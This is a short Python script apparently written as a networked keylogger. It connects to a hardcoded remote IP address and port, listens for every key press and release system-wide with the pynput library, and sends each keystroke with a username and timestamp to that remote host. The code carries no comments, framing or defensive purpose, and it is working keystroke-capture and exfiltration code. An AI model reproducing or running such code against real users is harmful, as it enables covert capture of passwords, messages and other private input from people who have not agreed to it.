import socket
from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

ClientSocket = socket.socket()
host = '37.152.230.38'
port = 5006
user = input("Enter a username") 
print('Waiting for connection')
try:
    ClientSocket.connect((host, port))
    print("Connected to host")
except socket.error as e:
    print(str(e))

Response = ClientSocket.recv(1024)

def on_press(key):
    print("{} pressed".format(key))
    r = "User: {} pressed this key: {} at {}".format(user, key, datetime.now().time())
    data = r.encode()
    ClientSocket.send(data)
    
def on_release(key):
    print("{} released".format(key))
    r = "User: {} released this key: {} at {}".format(user, key, datetime.now().time())
    data = r.encode()
    ClientSocket.send(data)
   
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

